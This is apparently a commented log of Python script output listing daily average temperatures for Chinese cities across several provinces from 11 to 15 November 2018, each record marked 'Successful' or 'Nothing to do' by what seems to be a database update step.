# {'name': '南京', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 13.425, 'date': '2018-11-13'}
# Nothing to do
# {'name': '南京', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 14.65, 'date': '2018-11-14'}
# Successful
# {'name': '南京', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 13.525, 'date': '2018-11-15'}
# Successful
# {'name': '扬州', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 12.549999999999999, 'date': '2018-11-11'}
# Nothing to do
# {'name': '扬州', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 11.8, 'date': '2018-11-12'}
# Nothing to do
# {'name': '扬州', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 12.350000000000001, 'date': '2018-11-13'}
# Nothing to do
# {'name': '扬州', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 14.225, 'date': '2018-11-14'}
# Successful
# {'name': '扬州', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 13.125, 'date': '2018-11-15'}
# Successful
# {'name': '南通', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 14.5, 'date': '2018-11-11'}
# Successful
# {'name': '南通', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 13.05, 'date': '2018-11-12'}
# Successful
# {'name': '南通', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 12.825, 'date': '2018-11-13'}
# Successful
# {'name': '南通', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 14.025, 'date': '2018-11-14'}
# Successful
# {'name': '南通', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 13.85, 'date': '2018-11-15'}
# Successful
# {'name': '苏州', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 15.075, 'date': '2018-11-11'}
# Nothing to do
# {'name': '苏州', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 14.399999999999999, 'date': '2018-11-12'}
# Nothing to do
# {'name': '苏州', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 13.675, 'date': '2018-11-13'}
# Nothing to do
# {'name': '苏州', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 15.35, 'date': '2018-11-14'}
# Successful
# {'name': '苏州', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 14.425, 'date': '2018-11-15'}
# Successful
# {'name': '无锡', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 14.975000000000001, 'date': '2018-11-11'}
# Successful
# {'name': '无锡', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 13.7, 'date': '2018-11-12'}
# Successful
# {'name': '无锡', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 12.55, 'date': '2018-11-13'}
# Successful
# {'name': '无锡', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 15.5, 'date': '2018-11-14'}
# Successful
# {'name': '无锡', 'prov': '江苏', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 14.225, 'date': '2018-11-15'}
# Successful
# {'name': '湖州', 'prov': '浙江', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 14.625, 'date': '2018-11-11'}
# Successful
# {'name': '湖州', 'prov': '浙江', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 13.775, 'date': '2018-11-12'}
# Successful
# {'name': '湖州', 'prov': '浙江', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 14.475000000000001, 'date': '2018-11-13'}
# Successful
# {'name': '湖州', 'prov': '浙江', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 15.5, 'date': '2018-11-14'}
# Successful
# {'name': '湖州', 'prov': '浙江', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 14.25, 'date': '2018-11-15'}
# Successful
# {'name': '杭州', 'prov': '浙江', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 15.750000000000002, 'date': '2018-11-11'}
# Nothing to do
# {'name': '杭州', 'prov': '浙江', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 13.7, 'date': '2018-11-12'}
# Nothing to do
# {'name': '杭州', 'prov': '浙江', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 14.075000000000001, 'date': '2018-11-13'}
# Nothing to do
# {'name': '杭州', 'prov': '浙江', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 15.350000000000001, 'date': '2018-11-14'}
# Successful
# {'name': '杭州', 'prov': '浙江', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 14.5, 'date': '2018-11-15'}
# Successful
# {'name': '温州', 'prov': '浙江', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 21.599999999999998, 'date': '2018-11-11'}
# Nothing to do
# {'name': '温州', 'prov': '浙江', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 16.1, 'date': '2018-11-12'}
# Nothing to do
# {'name': '温州', 'prov': '浙江', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 16.65, 'date': '2018-11-13'}
# Nothing to do
# {'name': '温州', 'prov': '浙江', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 16.424999999999997, 'date': '2018-11-14'}
# Successful
# {'name': '温州', 'prov': '浙江', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 16.775000000000002, 'date': '2018-11-15'}
# Successful
# {'name': '淮北', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 11.700000000000001, 'date': '2018-11-11'}
# Successful
# {'name': '淮北', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 8.9, 'date': '2018-11-12'}
# Successful
# {'name': '淮北', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 11.55, 'date': '2018-11-13'}
# Successful
# {'name': '淮北', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 13.875, 'date': '2018-11-14'}
# Successful
# {'name': '淮北', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 11.95, 'date': '2018-11-15'}
# Successful
# {'name': '合肥', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 12.45, 'date': '2018-11-11'}
# Nothing to do
# {'name': '合肥', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 13.325000000000001, 'date': '2018-11-12'}
# Nothing to do
# {'name': '合肥', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 14.05, 'date': '2018-11-13'}
# Nothing to do
# {'name': '合肥', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 14.25, 'date': '2018-11-14'}
# Successful
# {'name': '合肥', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 12.625, 'date': '2018-11-15'}
# Successful
# {'name': '芜湖', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 13.675, 'date': '2018-11-11'}
# Nothing to do
# {'name': '芜湖', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 13.725000000000001, 'date': '2018-11-12'}
# Nothing to do
# {'name': '芜湖', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 14.175, 'date': '2018-11-13'}
# Nothing to do
# {'name': '芜湖', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 14.924999999999999, 'date': '2018-11-14'}
# Successful
# {'name': '芜湖', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 13.875, 'date': '2018-11-15'}
# Successful
# {'name': '黄山', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 7.800000000000001, 'date': '2018-11-11'}
# Successful
# {'name': '黄山', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 4.425, 'date': '2018-11-12'}
# Successful
# {'name': '黄山', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 4.625, 'date': '2018-11-13'}
# Successful
# {'name': '黄山', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 7.675000000000001, 'date': '2018-11-14'}
# Successful
# {'name': '黄山', 'prov': '安徽', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 7.824999999999999, 'date': '2018-11-15'}
# Successful
# {'name': '福州', 'prov': '福建', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 22.6, 'date': '2018-11-11'}
# Nothing to do
# {'name': '福州', 'prov': '福建', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 18.85, 'date': '2018-11-12'}
# Nothing to do
# {'name': '福州', 'prov': '福建', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 17.1, 'date': '2018-11-13'}
# Nothing to do
# {'name': '福州', 'prov': '福建', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 18.425, 'date': '2018-11-14'}
# Successful
# {'name': '福州', 'prov': '福建', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 18.275, 'date': '2018-11-15'}
# Successful
# {'name': '厦门', 'prov': '福建', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 21.949999999999996, 'date': '2018-11-11'}
# Nothing to do
# {'name': '厦门', 'prov': '福建', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 21.349999999999998, 'date': '2018-11-12'}
# Nothing to do
# {'name': '厦门', 'prov': '福建', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 19.575, 'date': '2018-11-13'}
# Nothing to do
# {'name': '厦门', 'prov': '福建', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 20.025, 'date': '2018-11-14'}
# Successful
# {'name': '厦门', 'prov': '福建', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 21.075000000000003, 'date': '2018-11-15'}
# Successful
# {'name': '赣县', 'prov': '江西', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 18.55, 'date': '2018-11-11'}
# Nothing to do
# {'name': '赣县', 'prov': '江西', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 14.925, 'date': '2018-11-12'}
# Nothing to do
# {'name': '赣县', 'prov': '江西', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 15.7, 'date': '2018-11-13'}
# Nothing to do
# {'name': '赣县', 'prov': '江西', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 17.575000000000003, 'date': '2018-11-14'}
# Successful
# {'name': '赣县', 'prov': '江西', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 15.950000000000003, 'date': '2018-11-15'}
# Successful
# {'name': '九江', 'prov': '江西', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 12.95, 'date': '2018-11-11'}
# Successful
# {'name': '九江', 'prov': '江西', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 12.95, 'date': '2018-11-12'}
# Successful
# {'name': '九江', 'prov': '江西', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 13.875, 'date': '2018-11-13'}
# Successful
# {'name': '九江', 'prov': '江西', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 13.0, 'date': '2018-11-14'}
# Successful
# {'name': '九江', 'prov': '江西', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 13.325, 'date': '2018-11-15'}
# Successful
# {'name': '南昌', 'prov': '江西', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 14.350000000000001, 'date': '2018-11-11'}
# Nothing to do
# {'name': '南昌', 'prov': '江西', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 13.825, 'date': '2018-11-12'}
# Nothing to do
# {'name': '南昌', 'prov': '江西', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 14.8, 'date': '2018-11-13'}
# Nothing to do
# {'name': '南昌', 'prov': '江西', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 14.774999999999999, 'date': '2018-11-14'}
# Successful
# {'name': '南昌', 'prov': '江西', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 14.125, 'date': '2018-11-15'}
# Successful
# {'name': '烟台', 'prov': '山东', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 9.049999999999999, 'date': '2018-11-11'}
# Successful
# {'name': '烟台', 'prov': '山东', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 9.975000000000001, 'date': '2018-11-12'}
# Successful
# {'name': '烟台', 'prov': '山东', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 10.549999999999999, 'date': '2018-11-13'}
# Successful
# {'name': '烟台', 'prov': '山东', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 10.4, 'date': '2018-11-14'}
# Successful
# {'name': '烟台', 'prov': '山东', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 10.4, 'date': '2018-11-15'}
# Successful
# {'name': '济南', 'prov': '山东', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 8.15, 'date': '2018-11-11'}
# Nothing to do
# {'name': '济南', 'prov': '山东', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 9.175, 'date': '2018-11-12'}
# Nothing to do
# {'name': '济南', 'prov': '山东', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 10.674999999999999, 'date': '2018-11-13'}
# Nothing to do
# {'name': '济南', 'prov': '山东', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 12.475, 'date': '2018-11-14'}
# Successful
# {'name': '济南', 'prov': '山东', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 9.950000000000001, 'date': '2018-11-15'}
# Successful
# {'name': '青岛', 'prov': '山东', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 11.100000000000001, 'date': '2018-11-11'}
# Nothing to do
# {'name': '青岛', 'prov': '山东', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 11.45, 'date': '2018-11-12'}
# Nothing to do
# {'name': '青岛', 'prov': '山东', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 11.975000000000001, 'date': '2018-11-13'}
# Nothing to do
# {'name': '青岛', 'prov': '山东', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 13.15, 'date': '2018-11-14'}
# Successful
# {'name': '青岛', 'prov': '山东', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 12.825, 'date': '2018-11-15'}
# Successful
# {'name': '焦作', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 8.924999999999999, 'date': '2018-11-11'}
# Nothing to do
# {'name': '焦作', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 9.674999999999999, 'date': '2018-11-12'}
# Nothing to do
# {'name': '焦作', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 8.225, 'date': '2018-11-13'}
# Nothing to do
# {'name': '焦作', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 11.149999999999999, 'date': '2018-11-14'}
# Successful
# {'name': '焦作', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 11.4, 'date': '2018-11-15'}
# Successful
# {'name': '郑州', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 9.025, 'date': '2018-11-11'}
# Nothing to do
# {'name': '郑州', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 9.475, 'date': '2018-11-12'}
# Nothing to do
# {'name': '郑州', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 9.85, 'date': '2018-11-13'}
# Nothing to do
# {'name': '郑州', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 11.175, 'date': '2018-11-14'}
# Successful
# {'name': '郑州', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 11.75, 'date': '2018-11-15'}
# Successful
# {'name': '南阳', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 11.0, 'date': '2018-11-11'}
# Successful
# {'name': '南阳', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 9.075000000000001, 'date': '2018-11-12'}
# Successful
# {'name': '南阳', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 11.125, 'date': '2018-11-13'}
# Successful
# {'name': '南阳', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 11.975, 'date': '2018-11-14'}
# Successful
# {'name': '南阳', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 12.825, 'date': '2018-11-15'}
# Successful
# {'name': '信阳', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 11.45, 'date': '2018-11-11'}
# Nothing to do
# {'name': '信阳', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 9.975, 'date': '2018-11-12'}
# Nothing to do
# {'name': '信阳', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 11.575, 'date': '2018-11-13'}
# Nothing to do
# {'name': '信阳', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 11.825000000000001, 'date': '2018-11-14'}
# Successful
# {'name': '信阳', 'prov': '河南', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 13.149999999999999, 'date': '2018-11-15'}
# Successful
# {'name': '襄阳', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 12.475000000000001, 'date': '2018-11-11'}
# Nothing to do
# {'name': '襄阳', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 11.75, 'date': '2018-11-12'}
# Nothing to do
# {'name': '襄阳', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 11.0, 'date': '2018-11-13'}
# Nothing to do
# {'name': '襄阳', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 11.350000000000001, 'date': '2018-11-14'}
# Successful
# {'name': '襄阳', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 12.8, 'date': '2018-11-15'}
# Successful
# {'name': '恩施', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 12.125, 'date': '2018-11-11'}
# Nothing to do
# {'name': '恩施', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 12.4, 'date': '2018-11-12'}
# Nothing to do
# {'name': '恩施', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 12.4, 'date': '2018-11-13'}
# Nothing to do
# {'name': '恩施', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 12.5, 'date': '2018-11-14'}
# Successful
# {'name': '恩施', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 12.25, 'date': '2018-11-15'}
# Successful
# {'name': '宜昌', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 11.649999999999999, 'date': '2018-11-11'}
# Nothing to do
# {'name': '宜昌', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 13.1, 'date': '2018-11-12'}
# Nothing to do
# {'name': '宜昌', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 12.2, 'date': '2018-11-13'}
# Nothing to do
# {'name': '宜昌', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 11.625, 'date': '2018-11-14'}
# Successful
# {'name': '宜昌', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 12.175, 'date': '2018-11-15'}
# Successful
# {'name': '武汉', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 12.875000000000002, 'date': '2018-11-11'}
# Nothing to do
# {'name': '武汉', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 12.924999999999999, 'date': '2018-11-12'}
# Nothing to do
# {'name': '武汉', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 14.524999999999999, 'date': '2018-11-13'}
# Nothing to do
# {'name': '武汉', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 13.350000000000001, 'date': '2018-11-14'}
# Successful
# {'name': '武汉', 'prov': '湖北', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 13.875, 'date': '2018-11-15'}
# Successful
# {'name': '长沙', 'prov': '湖南', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 12.25, 'date': '2018-11-11'}
# Nothing to do
# {'name': '长沙', 'prov': '湖南', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 12.649999999999999, 'date': '2018-11-12'}
# Nothing to do
# {'name': '长沙', 'prov': '湖南', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 12.8, 'date': '2018-11-13'}
# Nothing to do
# {'name': '长沙', 'prov': '湖南', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 13.7, 'date': '2018-11-14'}
# Successful
# {'name': '长沙', 'prov': '湖南', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 12.525, 'date': '2018-11-15'}
# Successful
# {'name': '衡阳', 'prov': '湖南', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 13.275, 'date': '2018-11-11'}
# Successful
# {'name': '衡阳', 'prov': '湖南', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 12.9, 'date': '2018-11-12'}
# Successful
# {'name': '衡阳', 'prov': '湖南', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 13.9, 'date': '2018-11-13'}
# Successful
# {'name': '衡阳', 'prov': '湖南', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 14.825, 'date': '2018-11-14'}
# Successful
# {'name': '衡阳', 'prov': '湖南', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 13.7, 'date': '2018-11-15'}
# Successful
# {'name': '郴州', 'prov': '湖南', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 12.325, 'date': '2018-11-11'}
# Nothing to do
# {'name': '郴州', 'prov': '湖南', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 11.375, 'date': '2018-11-12'}
# Nothing to do
# {'name': '郴州', 'prov': '湖南', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 12.500000000000002, 'date': '2018-11-13'}
# Nothing to do
# {'name': '郴州', 'prov': '湖南', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 15.275000000000002, 'date': '2018-11-14'}
# Successful
# {'name': '郴州', 'prov': '湖南', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 12.6, 'date': '2018-11-15'}
# Successful
# {'name': '韶关', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 23.175, 'date': '2018-11-11'}
# Successful
# {'name': '韶关', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 17.799999999999997, 'date': '2018-11-12'}
# Successful
# {'name': '韶关', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 19.5, 'date': '2018-11-13'}
# Successful
# {'name': '韶关', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 21.0, 'date': '2018-11-14'}
# Successful
# {'name': '韶关', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 19.4, 'date': '2018-11-15'}
# Successful
# {'name': '广州', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 23.574999999999996, 'date': '2018-11-11'}
# Nothing to do
# {'name': '广州', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 23.200000000000003, 'date': '2018-11-12'}
# Nothing to do
# {'name': '广州', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 22.700000000000003, 'date': '2018-11-13'}
# Nothing to do
# {'name': '广州', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 23.65, 'date': '2018-11-14'}
# Successful
# {'name': '广州', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 23.35, 'date': '2018-11-15'}
# Successful
# {'name': '珠海', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 24.225, 'date': '2018-11-11'}
# Successful
# {'name': '珠海', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 24.825, 'date': '2018-11-12'}
# Successful
# {'name': '珠海', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 23.625, 'date': '2018-11-13'}
# Successful
# {'name': '珠海', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 23.4, 'date': '2018-11-14'}
# Successful
# {'name': '珠海', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 23.674999999999997, 'date': '2018-11-15'}
# Successful
# {'name': '深圳', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 24.349999999999998, 'date': '2018-11-11'}
# Nothing to do
# {'name': '深圳', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 24.875, 'date': '2018-11-12'}
# Nothing to do
# {'name': '深圳', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 23.675, 'date': '2018-11-13'}
# Nothing to do
# {'name': '深圳', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 23.325, 'date': '2018-11-14'}
# Successful
# {'name': '深圳', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 23.35, 'date': '2018-11-15'}
# Successful
# {'name': '湛江', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 24.950000000000003, 'date': '2018-11-11'}
# Nothing to do
# {'name': '湛江', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 24.325, 'date': '2018-11-12'}
# Nothing to do
# {'name': '湛江', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 24.725, 'date': '2018-11-13'}
# Nothing to do
# {'name': '湛江', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 25.000000000000004, 'date': '2018-11-14'}
# Successful
# {'name': '湛江', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 24.475, 'date': '2018-11-15'}
# Successful
# {'name': '茂名', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 25.225, 'date': '2018-11-11'}
# Successful
# {'name': '茂名', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 25.025000000000002, 'date': '2018-11-12'}
# Successful
# {'name': '茂名', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 24.799999999999997, 'date': '2018-11-13'}
# Successful
# {'name': '茂名', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 24.725, 'date': '2018-11-14'}
# Successful
# {'name': '茂名', 'prov': '广东', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 24.299999999999997, 'date': '2018-11-15'}
# Successful
# {'name': '桂林', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 15.975000000000001, 'date': '2018-11-11'}
# Nothing to do
# {'name': '桂林', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 14.125, 'date': '2018-11-12'}
# Nothing to do
# {'name': '桂林', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 15.049999999999999, 'date': '2018-11-13'}
# Nothing to do
# {'name': '桂林', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 16.225, 'date': '2018-11-14'}
# Successful
# {'name': '桂林', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '15', 'TEM_Avg': 15.475000000000001, 'date': '2018-11-15'}
# Successful
# {'name': '柳州', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '11', 'TEM_Avg': 20.0, 'date': '2018-11-11'}
# Nothing to do
# {'name': '柳州', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '12', 'TEM_Avg': 14.325, 'date': '2018-11-12'}
# Nothing to do
# {'name': '柳州', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '13', 'TEM_Avg': 15.125, 'date': '2018-11-13'}
# Nothing to do
# {'name': '柳州', 'prov': '广西', 'year': '2018', 'month': '11', 'day': '14', 'TEM_Avg': 16.875, 'date': '2018-11-14'}
# Successful
